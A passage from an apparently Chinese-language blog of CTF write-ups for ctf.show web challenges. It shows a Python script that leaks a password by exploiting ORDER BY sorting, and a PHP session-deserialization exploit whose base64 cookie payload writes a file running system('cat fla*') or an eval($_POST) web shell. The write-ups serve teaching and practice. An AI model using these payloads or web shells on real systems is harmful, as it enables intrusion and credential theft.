class="string">&quot;login&quot;</span>] === <span class="literal">true</span>)&#123;</span><br><span class="line">		<span class="variable">$con</span> = mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;web15&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="variable">$order</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;order&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$order</span>) &amp;&amp; strlen(<span class="variable">$order</span>)&lt;<span class="number">6</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\&#x27;|\’|\“|\&quot;|\&lt;|\&gt;|\?|\,|\.|\?/i&quot;</span>,<span class="variable">$order</span>))&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$sql</span>=<span class="string">&quot;select * from user order by <span class="subst">$order</span>&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$sql</span>=<span class="string">&quot;select * from user order by id&quot;</span>;</span><br><span class="line">        &#125;   </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">     &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?=</span><span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?=</span><span class="variable">$row</span>[<span class="string">&#x27;uname&#x27;</span>];<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?=</span><span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>];<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?=</span><span class="variable">$row</span>[<span class="string">&#x27;nname&#x27;</span>];<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以利用?order=pwd来判断注册的密码与flag用户密码的大小（即 select * from user order by pwd;），当我们按照pwd排序时，比如 flag用户的密码为flag{123}，我们从小到大 一直到f都在他的上面，当我们注册的密码为g时，则出现第一个在下面的<br>顺序大致是这样，这时我们就可以判断密码的第一个字符为f，手工的话会比较麻烦，这里献上python脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author 羽</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;https://fa8f49b7-5fc6-4dcb-97a1-b0e842429a9b.chall.ctf.show&quot;</span></span><br><span class="line">url1=url+<span class="string">&quot;/reg.php&quot;</span> <span class="comment">#注册页面</span></span><br><span class="line">url2=url+<span class="string">&quot;/login.php&quot;</span><span class="comment">#登录界面</span></span><br><span class="line">url3=url+<span class="string">&quot;/user_main.php?order=pwd&quot;</span> <span class="comment">#查询界面</span></span><br><span class="line">k=<span class="string">&quot;&quot;</span></span><br><span class="line">s=<span class="string">&quot;-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="comment">#print(i)</span></span><br><span class="line">        l=<span class="string">&quot;&quot;</span></span><br><span class="line">        l=k+i</span><br><span class="line">        l2 = k+<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>)</span><br><span class="line">        data=&#123;<span class="string">&#x27;username&#x27;</span>:l,</span><br><span class="line">                    <span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;nickname&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;password&#x27;</span>:l</span><br><span class="line">        &#125;</span><br><span class="line">        data2=&#123;<span class="string">&#x27;username&#x27;</span>:l,</span><br><span class="line">                      <span class="string">&#x27;password&#x27;</span>:l</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l==<span class="string">&#x27;flag&#x27;</span>):</span><br><span class="line">            k=<span class="string">&#x27;flag&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(k)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        session = requests.session()</span><br><span class="line">        r1 = session.post(url1,data)</span><br><span class="line">        r2 = session.post(url2,data)</span><br><span class="line">        r3 = session.get(url3)</span><br><span class="line">        t = r3.text</span><br><span class="line">        <span class="comment">#print(l)</span></span><br><span class="line">        <span class="keyword">if</span> (t.index(<span class="string">&quot;&lt;td&gt;&quot;</span>+l+<span class="string">&quot;&lt;/td&gt;&quot;</span>)&gt;t.index(<span class="string">&quot;&lt;td&gt;flag@ctf.show&lt;/td&gt;&quot;</span>)):</span><br><span class="line">            k=l2</span><br><span class="line">            <span class="built_in">print</span>(k)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">         </span><br></pre></td></tr></table></figure>

<p>关于s中的字符是怎么来的这里做下解释：<br>动态的flag一般是 flag{1abc-aaa}这种，花括号中的值为小写字母+数字+”-“的组合，那么其他的字符又是为什么添加进来呢，这是因为我写的脚本是注册的用户出现在flag用户的下面时，获得他的上一个字符串。比如第一个字符为-，那当我们注册的密码为点号(.)时才能判断，所以需要加上点号(.)，其他的同理。</p>
<p>特殊说明一下：<br>因为存在flag用户所以当我们注册的用户名为flag，密码为flag时，可以注册成功，但是无法用我们注册的密码登录。所以中间加了个判断。</p>
<h2 id="一切看起来都那么合情合理"><a href="#一切看起来都那么合情合理" class="headerlink" title="一切看起来都那么合情合理"></a>一切看起来都那么合情合理</h2><p><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 下载源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">	session_start();</span><br><span class="line">	<span class="comment">//超过5次禁止登陆</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;<span class="number">5</span>?<span class="keyword">die</span>(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line">		<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +<span class="number">1</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 setcookie(<span class="string">&quot;limit&quot;</span>,base64_encode(<span class="string">&#x27;1&#x27;</span>));</span><br><span class="line">		 <span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]，所以只执行后面</span><br><span class="line">    session赋值为cookie的base64解码</span><br><span class="line">    下面是cookie的变化，没用</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">check.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$GET</span> = <span class="keyword">array</span>(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$GET</span>)&#123;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$data</span>= <span class="variable">$db</span>-&gt;get(<span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">	[	<span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;UserName0&#x27;</span></span><br><span class="line">	],[</span><br><span class="line">		<span class="string">&quot;AND&quot;</span>=&gt;[</span><br><span class="line">		<span class="string">&quot;UserName0[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;u&#x27;</span>],</span><br><span class="line">		<span class="string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="variable">$GET</span>[<span class="string">&#x27;pass&#x27;</span>] <span class="comment">//密码必须为128位大小写字母+数字+特殊符号，防止爆破</span></span><br><span class="line">		]</span><br><span class="line">	]);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">		<span class="comment">//登陆成功取消次数累计</span></span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]= <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;success&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;欢迎您&quot;</span>.<span class="variable">$data</span>[<span class="string">&#x27;UserName0&#x27;</span>]));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">//登陆失败累计次数加1</span></span><br><span class="line">		<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>])+<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;error&quot;</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;登陆失败&quot;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>包含了inc.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">inc.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">date_default_timezone_set(<span class="string">&quot;Asia/Shanghai&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">use</span> \<span class="title">CTFSHOW</span>\<span class="title">CTFSHOW</span>; </span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;CTFSHOW.php&#x27;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> CTFSHOW([</span><br><span class="line">    <span class="string">&#x27;database_type&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database_name&#x27;</span> =&gt; <span class="string">&#x27;web&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;port&#x27;</span> =&gt; <span class="number">3306</span>,</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;option&#x27;</span> =&gt; [</span><br><span class="line">        PDO::ATTR_CASE =&gt; PDO::CASE_NATURAL</span><br><span class="line">    ]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sql注入检查</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\（|\）|\+|\=|\[|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\?/i&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">&quot;log-&quot;</span>.<span class="keyword">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="keyword">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.date_create()-&gt;format(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*生成唯一标志</span></span><br><span class="line"><span class="comment">*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">uuid</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$chars</span> = md5(uniqid(mt_rand(), <span class="literal">true</span>));  </span><br><span class="line">    <span class="variable">$uuid</span> = substr ( <span class="variable">$chars</span>, <span class="number">0</span>, <span class="number">8</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . substr ( <span class="variable">$chars</span>, <span class="number">8</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span> </span><br><span class="line">            . substr ( <span class="variable">$chars</span>, <span class="number">12</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . substr ( <span class="variable">$chars</span>, <span class="number">16</span>, <span class="number">4</span> ) . <span class="string">&#x27;-&#x27;</span></span><br><span class="line">            . substr ( <span class="variable">$chars</span>, <span class="number">20</span>, <span class="number">12</span> );  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$uuid</span> ;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>ini_set(‘session.serialize_handler’, ‘php’);说明原来是php_serialize</p>
<p>漏洞利用点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">inc.php里面重要的代码</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">&quot;log-&quot;</span>.<span class="keyword">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="keyword">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.date_create()-&gt;format(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在我们就要利用session进行序列化执行User类的file_put_contents()函数写入一句话，得到fla</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在index.php里面开启了session回话，并且这里的<span class="variable">$_SESSION</span>的值我们可以控制</span><br><span class="line">我们就可以通过<span class="variable">$_SESSION</span>的值传递我们的payload入服务器的<span class="regexp">/tmp/</span>sess_xxx生成我们构造的序列化payload</span><br></pre></td></tr></table></figure>

<p>check.php里面最重要的就是require_once ‘inc/inc.php’，我们就可以访问check.php进行执行我们构造好的payload<br>因为该文件包含了inc.php文件，而inc.php文件里面会根据ini_set(‘session.serialize_handler’, ‘php’);的设置去读取/tmp/sess_xxxx文件里面的内容并且进行反序列化，执行file_put_contents()函数。</p>
<p>可以利用index.php里面的session_start()设置,控制$_SESSION的值（也就是limit）写入我们的payload到服务器的/tmp/sess_xxxx，然后利用inc.php里面的ini_set(‘session.serialize_handler’, ‘php’)设置去反序列化服务器上的/tmp/sess_xxxx文件，从而执行inc.php里面User类的file_put_contents()函数写入一句话</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;&lt;?php system(&#x27;cat fla*&#x27;);?&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&quot;|&quot;</span>.serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyNjoiPD9waHAgc3lzdGVtKCd0YWMgZmwqJyk7Pz4iO3M6Njoic3RhdHVzIjtOO30=</span><br></pre></td></tr></table></figure>

<p>具体实操：</p>
<p>先访问index.php,修改limit的cookie为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyNjoiPD9waHAgc3lzdGVtKCd0YWMgZmwqJyk7Pz4iO3M6Njoic3RhdHVzIjtOO30=</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220321211220453.png" alt="image-20220321211220453"></p>
<p>execute</p>
<p>写进去之后，这样session文件中就写入了我们需要的内容,访问check.php?u=123&amp;pass=123。因为包含了inc.php，inc.php中又改变了session引擎，进而反序列化出一个User类的实例，而这个实例在销毁的时候调用了<code>--destruct()</code>方法，进而达成了写shell的目的。</p>
<p>execute</p>
<p>最后访问log-1.php,成功rce</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">或者：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User(<span class="string">&quot;1.php&quot;</span>,<span class="string">&#x27;&lt;?php eval($_POST[&quot;1&quot;]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&#x27;|&#x27;</span>.serialize(<span class="variable">$a</span>));</span><br><span class="line">post命令执行即可</span><br><span class="line"></span><br><span class="line">内置函数在<span class="keyword">eval</span>里面直接执行时不需要加分号</span><br><span class="line">    <span class="keyword">eval</span>(system(<span class="string">&#x27;ls&#x27;</span>))  或：</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>)</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/29/JavaWeb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

